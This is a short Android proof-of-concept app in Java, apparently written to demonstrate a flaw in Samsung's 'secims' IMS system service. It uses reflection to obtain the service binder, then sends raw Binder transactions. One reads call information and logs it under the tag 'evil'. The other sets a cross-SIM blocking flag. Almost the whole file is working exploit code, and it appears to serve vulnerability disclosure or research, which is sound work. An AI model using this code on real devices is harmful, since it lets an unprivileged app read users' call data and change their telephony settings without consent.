package poc.app;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

import com.sec.ims.cmc.CmcCallInfo;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            IBinder binder = getService("secims");
            getCmcCallInfo(binder);
            setCrossSimPermanentBlocked(binder);
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }

    static final int TRANSACTION_getCmcCallInfo = 93;

    private void getCmcCallInfo(IBinder binder) throws Throwable {
        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken(binder.getInterfaceDescriptor());

        Parcel reply = Parcel.obtain();

        binder.transact(TRANSACTION_getCmcCallInfo, parcel, reply, 0);
        reply.readException();

        if (reply.readBoolean()) {
            Log.d("evil", "Reply: " + CmcCallInfo.CREATOR.createFromParcel(reply));
        }
    }

    static final int TRANSACTION_setCrossSimPermanentBlocked = 124;

    private void setCrossSimPermanentBlocked(IBinder binder) throws Throwable {
        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
        parcel.writeInt(0);
        parcel.writeBoolean(true);

        Parcel reply = Parcel.obtain();

        binder.transact(TRANSACTION_setCrossSimPermanentBlocked, parcel, reply, 0);
        reply.readException();
    }

    private IBinder getService(String name) throws Throwable {
        return (IBinder) Class.forName("android.os.ServiceManager")
                .getDeclaredMethod("getServiceOrThrow", String.class)
                .invoke(null, name);
    }
}